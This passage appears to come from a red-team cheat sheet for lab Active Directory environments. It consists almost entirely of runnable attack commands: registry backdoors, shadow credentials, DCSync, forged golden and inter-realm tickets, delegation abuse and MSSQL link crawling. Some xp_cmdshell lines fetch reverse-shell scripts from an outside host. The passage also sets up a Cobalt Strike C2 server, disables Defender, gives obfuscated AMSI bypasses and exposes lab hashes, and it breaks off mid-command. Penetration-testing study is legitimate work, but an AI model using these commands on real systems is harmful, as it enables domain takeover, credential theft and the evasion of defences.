    # Using RACE or DAMP Toolkit to registry based backdoor
    Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser1 -Verbose

    # Set backdoor to retrive Machine Account Hash, Local Account Hash or Cached Credentials remotely
    Get-RemoteMachineAccountHash -ComputerName us-dc Verbose
    Get-RemoteLocalAccountHash -ComputerName us-dc Verbose
    Get-RemoteCachedCredential -ComputerName us-dc Verbose
    ```

### Shadow Credentials

    ```powershell
    # User and Computer where we have write permission, we can inject shadow credentials (certificate in msDS-KeyCredentialLink attribute that which acts alternate credentials). Used by Windows Hello for Bussiness

    >> CASE I: Shadow Credentials Attack for User Account 

    # Step 1. Identify the User Object having Write/GenricAll permission
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

    # Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)

    # Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor
    Whisker.exe add /target:support41user

    # Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user
    Get-DomainUser -Identity supportXuser

    # Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user
    Rubeus.exe asktgt /user:supportXuser /certificate:xyz== /password:"1337" /domain:us.techcorp.local
    /dc:US DC.us.techcorp.local /getcredentials /show /nowrap /ptt

    >> CASE II: Shadow Credentials Attack for Machine Account 

    # Step 1. Identify the Computer Object having Write/GenricAll permission
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}

    # Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)
    C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"

    # Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor
    Whisker.exe add /target:us-helpdesk$

    # Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user
    Get-DomainComputer -Identity us-helpdesk

    # Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user
    Rubeus.exe asktgt /user:us-helpdesk$ /certificate:xyz== /password:"1337" /domain:us.techcorp.local
    /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap /ptt

    Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:xyz== /impersonateuser:administrator /ptt /self
    /altservice:cifs/us-helpdesk
    ```

### Azure AD Connect

    ```powershell

    # Step 1. Identify the AD Connect user account and machine for syncing the hash between On-prem and Azure AD
    Get-DomainUser -Identity MSOL* -Domain techcorp.local | select -ExpandProperty description

    # Step 2. Get access to the server identified in the description via helpdesk user (admin)
    .\SafetyKatz.exe "sekurlsa::pth /user:helpdeskadmin /domain:us.techcorp.local /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /run:powershell.exe" "exit"

    # Load & execute the ADconnect.ps1 script to fetch the plain text password for MSOL_* user
    iwr http://192.168.100.41:8080/adconnect.ps1 -O adconnect.ps1
    . .\adconnect.ps1
    adconnect

    Domain: techcorp.local
    Username: MSOL_16fb75d0227d
    Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf

    # Open the netonly session for above user 
    runas /netonly /user:MSOL_16fb75d0227d cmd.exe

    # Now, perform DCSync attack to fetch the secrets from DC
    C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
    ```

## Cross Domain Attacks

### Intra-Forest Privilege Escalation (Child [us.techcorp.local] -> Parent [techcorp.local])

### CASE 1: Using Trusted Domain Object (TDO) + SID Histroy

```powershell
# Step 1. fetch the Trust Key (Inward) using one of the following method from child DC
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName us-dc

# Step 2. Forge Inter-Realm Trust Ticket 
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726 163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:189517f6dde94659c0aacf1674e46765 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"' 

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:9fb9e247a02e6fde1631efa7fedce6a2 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

# Step 3. Inject the TGT in memory and Use Rubeus to request TGS for CIFS Service on Parent-DC
Invoke-Mimikatz -Command '"kerberos::ptt trust_tkt.kirbi"'

# Step 4. Use TGT to fetch TGS for CIFS Servie on Parent DC
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

# Step 5. Access the service
ls \\techcorp-dc.techcorp.local\c$
```

### CASE 2: Using KRBTGT account hash of Child Domain + SID History

```powershell
# Step 1. fetch the ntlm hash of krbtgt account in child domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'

# Step 2. Forge the golden ticket with  Trust key 
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"

# Step 4. Access the service
ls \\techcorp-dc.techcorp.local\c$
Enter-PSSession techcorp-dc.techcorp.local

# Alternately, we can use DC group SID (516) for crafting forged ticket and then perform DCSync
Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\Administrator /domain:techcorp.local"'
```

### Inter-Forest Attack - Regular Domain Based Attacks

```powershell

>> Kerberost Across Forest Trust
# Note: Enumeration of domain is possible in case of Inound Trust 
Get-DomainUser -SPN -Domain eu.local | select name, serviceprincipalname

.\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt

C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt

>> Constrained Delegation Across Forest Trust
# Note: Requires access to the user/machine account having Constrained Delegation enabled

# Step 1.Identofy the user and service where constrained delgation is allowed
Get-DomainUser -TrustedToAuth -Domain eu.local  | select samaccountname,msds-allowedtodelegateto

# Step 2. Calculate the NTLM hash from the user password
.\Rubeus.exe hash /password:Qwerty@123 /domain:eu.local /user:storagesvc

# Step 3. Execute S4U attack to fetch the TGS for CIFS service as Admin on EU-DC
.\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /msdsspn:"time/EU-DC.eu.local" /altservice:CIFS /domain:eu.local /dc:eu-dc.eu.local /ptt

# Step 4. Access the service
ls \\eu-dc.eu.local\c$

>> Unconstrained Delegation
#Note: Only works if Two-way trust is enabled with TGT Delegation enabled (disabled by default). There is no way to know if TGT delegation is allowed across forest without logging onto the target forest DC and leverage netdom command or AD Module. We can directly attempt the PrintSpool attack and see if it works!

# Step 1. Enumerate if TGT Delegation is enabled across forest trust (only possible from target Domain DC)
netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation

# Step 2. Login to machine in current domain having Unconstrained Delegation (us-web)
.\SafetyKatz.exe "sekurlsa::pth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:powershell.exe" "exit"

winrs -r:us-web powershell

# Step 3. Execute Rubeus to monitor the TGT on us-web
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 4. Trigger PrintSpool attack (form student vm)
.\MS-RPRN.exe \\euvendor-dc.euvendor.local \\us-web.us.techcorp.local

# Step 5. Import the ticket in memory
.\Rubeus ptt /ticket:xyz==

# Step 6. Perform DCSync attack
Invoke-Mimikatz -Command '"lsadump::dcsync /user:administrator /domain:usvendor.local /dc:usvendor-dc.usvendor.local"'
C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local

```

### Inter-Forest Attack - SID History enabled (eu->euvendor) ]

```powershell

# Retrive domain trust account hash 
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computer eu-dc.eu.local
5cc0d1e3f17b532a70d5826843af74e1

# Current domain SID
Get-DomainSid
S-1-5-21-3657428294-2017276338-1274645009

# Target Domain SID
Get-DomainSid -Domain euvendor.local
S-1-5-21-4066061358-3942393892-617142613

# Group ID which needs to be impersonated as it has RID > 1000
Get-DomainGroup -Identity Euadmins  -domain euvendor.local
S-1-5-21-4066061358-3942393892-617142613-1103

# Create Golden Ticket for User having RID> 1000 as any SID <1000 (DA,EA) will be filtered
Invoke-Mimikatz -Command '"kerberos::golden /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /rc4:5cc0d1e3f17b532a70d5826843af74e1 /user:Administrator /service:krbtgt /target:euvendor.local /ticket:C:\eu_trust_tkt.kirbi"' 

# Request CIFS TGS ticket for share on DC using TGT genereatd above
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# Once we have access as the normal user on target domain, we can enumerate for local admin rights on other server in domain as "euvendor-net.euvendor.local" 
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# Invoke command using Powershell remoting
winrs -r:euvendor-net.euvendor.local hostname

Invoke-Command -ScriptBlock {whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential

NOTE: if 'SIDFilteringForestAware' and 'SIDFilteringQuarantined' is set to 'False', then it wont be possible to use forged inter-realm TGT impersonating RID > 1000.
```

### Inter-Forest Attack - Abusing PAM Trust

```powershell

# PAM Trust is enabled between red/bastion forest and Production Forest using Shadow credentials. These credentials are created in Basion domain and mapped with DA/EA group of production forest

# Check for Foreign Security Pricipal (Group/User) in Target Forest (bastion) from techcorp.local
Get-ADTrust -Filter * 
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local

# Get the ForeignSecurityPrincipal

Get-DomainObject -domain bastion.local | ?{$_.objectclass -match "foreignSecurityPrincipal"} 

## These SIDs can access to the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

## With the by default SIDs, we find S-1-5-21-493355955-4215530352-779396340-1104
## We search it in our current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}

# Gain Access to Basion-DC (use ntlm auth)
 .\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:bastion.local /dc:bastion-dc.bastion.local /rc4:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"

# On basion-dc, enumerate if there is a PAM trust by validating below 2 conditions for given trust
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-DomainTrust

# It can also be verified by presence of shadow pricipal conatiner
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter *  -Properties *| select Name,member,msDS-ShadowPrincipalSid

Get-DomainObject -Searchbase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local"

# Find the IP address of production-dc using DNS Query or Ping command
Get-DNSServerZone -Zonename production.local | fl *

# Enable Trusted Host configuration for WinRM from Admin shell
Set-Item WSMan:\localhost\Client\TrustedHosts *

# Connect with remote system
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential

```

### MSSQL DB Attacks

1. Check the SPN's
2. Check which SPN's you have access to
3. Check the Privileges you have of the above filtered SPN's
4. Keep note of the Instance-Name, ServicePrincipalName and the DomainAccount-Name
5. If you find any service with higher privileges continue below to abuse it

```powershell

#----Forest Trusts MSSQL Abuse----------
# Import PowerUpSql
Import-Module .\PowerupSQL-master\PowerupSQL.psd1
iex (iwr https://192.168.100.X/PowerUpSQL.ps1 -UseBasicParsing)

# Scan for MSSQL DB Installation by SPN Search
Get-SQLInstanceDomain # Enumerate SPN
Get-SQLInstanceDomain -Instance dcorp-mssql.organicsecurity.local

# Check if the current logged-on user has access to SQL Database - Check Access
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose




# Gather more info about identified db - Check Privileges / Gather Infromation
Get-SQLInstanceDomain | Get-SQLServerInfo
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose


# Scan for MSSQL misconfigurations to escalate to SA - Check impersonation rights
 
Invoke-SQLAudit -Verbose -Instance <instanceName>
Invoke-SQLAudit -Verbose -Instance TARGETSERVER

```

```powershell

#-----MSSQL Database Links -----------
# Execute SQL query  
Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER

# Check for presence of DB Link - Enumerate SQL Server links
Get-SQLServerLink -Instance <instanceName> -Verbose
Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local
select * from master..sysservers

# Crawl the DB Link to enecute command, choose specific system via QueryTarget parameter - Enumerate DB links

Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local 
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget db-sqlsrv

Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')



# Take reverse shell from DB -  Execute commands on target server

Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft

Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1'')"' -QueryTarget db-sqlsrv | select instance,links,customquery | ft

## Download file on target server
Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://IP:8080/Invoke-HelloWorld.ps1'',''C:\Windows\Temp\Invoke-HelloWorld.ps1'')"'


## Take reverse shell from DB (BypassLogging & AV detection)
Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell ''powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv | select instance,links,customquery | ft

Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell ''powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv 



# Run command (enables XP_CMDSHELL automatically if required)  
Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" | select -ExpandProperty CommandResults

# Enable rpc and rpcout on DB-SQLSRV (may require to run it twice)
Invoke-SQLCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

# DB Query to enable XP_CMDSHELL
Invoke-SQLCmd -Query "EXECUTE('sp_configure ''show advanced options'', 1; reconfigure') AT ""db-sqlsrv"""
Invoke-SQLCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure') AT ""db-sqlsrv"""

# Use specific credentials to query db
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

# Check for Impersonation attack - Extra Commands
## Impersonate an user

Invoke-SQLAuditPrivImpersonateLogin -Instance <instanceName> -Exploit -Verbose

#Then, we can EXECUTE AS, and chained the 'EXECUTE AS'
Get-SQLServerLinkCrawl -Verbose -Instance <instanceName> -Query "EXECUTE AS LOGIN = 'dbuser'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'powershell -c iex (new-object net.webclient).downloadstring(''http://IP/Invoke-HelloWorld.ps1'')'"


Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit

Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''

# Impersonate user and execute db query
Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin';  select system_user" -Instance sqldb.organicsecurity.local

Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin'; EXECUTE AS LOGIN = 'sa';  select system_user" -Instance sqldb.organicsecurity.local

# Execute OS level command by impersonating the user
Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin';  EXECUTE AS LOGIN = 'sa'; exec master..xp_cmdshell 'powershell -c ''Set-MpPreference -DisableRealtimeMonitoring $true'''" -Instance sqldb.organicsecurity.local

```

### MISC

```powershell
# Run a python3 webserver
$ python3 -m http.server

# Check outbound access to TeamServer
$ iwr -Uri http://nickelviper.com/a

# Change incoming firewall rules
beacon> powerpick New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick Remove-NetFirewallRule -DisplayName "Test Rule"

## Encode the powershell payload for handling extra quotes 

# Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

```

### Command & Control

- Setting up DNS records for DNS based beacon payloads

```powershell
# Set below DNS Type A & NS records, where IP points to TeamServer

@    | A  | 10.10.5.50
ns1  | A  | 10.10.5.50
pics | NS | ns1.nickelviper.com

# Verify the DNS configuration from TeamServer, it should return 0.0.0.0
$ dig @ns1.nickelviper.com test.pics.nickelviper.com +short

# Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration

```

- Start the team server and run as service

```powershell
> sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

```powershell
$ sudo vim /etc/systemd/system/teamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

$ sudo systemctl daemon-reload
$ sudo systemctl status teamserver.service
$ sudo systemctl start teamserver.service
$ sudo systemctl enable teamserver.service
```

- Enable Hosting of Web Delivery Payloads via agscript client in headless mode

```powershell
$ cat host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
}

# Add below command in "/etc/systemd/system/teamserver.service" file

ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'

```

```powershell
# Custom C2 Profile for CRTO
set sample_name "Dumbledore";
set sleeptime "5000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "true";

post-ex {
        set amsi_disable "true";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
}

http-get {
	set uri "/cat.gif /image /pixel.gif /logo.gif";

	client {
        	# customize client indicatorsi
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";

		parameter "utm" "ISO-8898-1";
		parameter "utc" "en-US";

		metadata{
			base64;
			header "Cookie";
		}
	}

	server {
		# customize soerver indicators
		header "Content-Type" "image/gif";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

http-post {
	set uri "/submit.aspx /finish.aspx";

	client {

		header "Content-Type" "application/octet-stream";
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";
		
		id{
			parameter "id";
		}

		output{
			print;
		}

	}

	server {
		# customize soerver indicators
		header "Content-Type" "text/plain";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			print;
		}
	}
}

http-stager {

	server {
		header "Content-Type" "application/octet-stream";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	
	}
}

```

### Defender Antivirus

```powershell

# Compile the Artifact kit
$ ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts

# Compile the resource kit
$ ./build.sh /mnt/c/Tools/cobaltstrike/resources

# Verify if the payload is AV Safe
PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI

# Load the CNA file: Cobalt Strike > Script Manager > Load_ and select the CNA
# Use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`

# Disable AMSI in Malleable C2 profile
$ vim c2-profiles/normal/webbug.profile

#Right above the `http-get` block, add the following:
post-ex {
        set amsi_disable "true";
}

# Verify the modified C2 profile
attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile

# Creating custom C2 profiles
https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/

# Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.

# Behaviour Detections (change default process for fork & run)
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

# Change the default process for psexec
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

# Disable Defender from local powershell session
Get-MPPreference

## Bypass real time monitoring ( admin privs ) Disable Defender

Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true

# AMSI bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{O}"-F'F', 'rE' ) ) 3; ( GeT-VariaBle ( "1Q2U" + "zX" )  -VaL_s+)."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{@}{5}" -f'Util', 'A', 'Amsi','.Management.', 'utomation.','s', 'System' ))."g`etf`iE1D"( ( "{O}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{O}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )



##Base64
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

##On PowerShell 6
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

### Bypass Real-Time-monitoring

```powershell

Powershell Set-MpPreference -DisableRealtimeMonitoring $true
Powershell Set-MpPreference -DisableIOAVProtection $true
powershell set-MpPreference -DisableAutoExclusions $true

```

### Create PowerShell credentials and execute commands


```powershell

$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CORP\john", $pass)

# Enter PSSession
Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred

# New-PSSession


# Invoke-command for command injection
## Display allowed commands we can execute on remote machine

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {whoami}
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {get-command}

## Write File using ScriptBlock

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}

## Edit file using ScriptBlock

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((cat "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\msfvenom.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred

## Command execution using command and ScriptBlock


Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -ScriptBlock {whoami}
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami}

## File execution using ScriptBlock

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}

## File execution using FilePath

Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"

## Language Mode


Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}

```

### Execute locally loaded function on the remote machines

+ Example : Hello.ps1

```powershell
function hello
{
Write-Output "Hello from the function"
}
```

+ load the function on our machine

	+ `. .\Hello.ps1`
 

```powershell
# execute the locally loaded functions

Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

```








### Adding User to local administrator group

```powershell

net localgroup administrators user /add

```

### Running commands in a specific user context in PowerShell

```powershell

powershell.exe -c "$user='WORKGROUP\John'; $pass='password123'; try { Invoke-Command -ScriptBlock { Get-Content C:\Users\John\Desktop\secret.txt } -ComputerName Server123 -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo $_.Exception.Message }" 2>&1

```

### Command to check whoami after pass-the-hash attack

```powershell

# passing Arguments. Keep in mind that only positional arguments could be passed this way
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list of servers>) -
ArgumentList


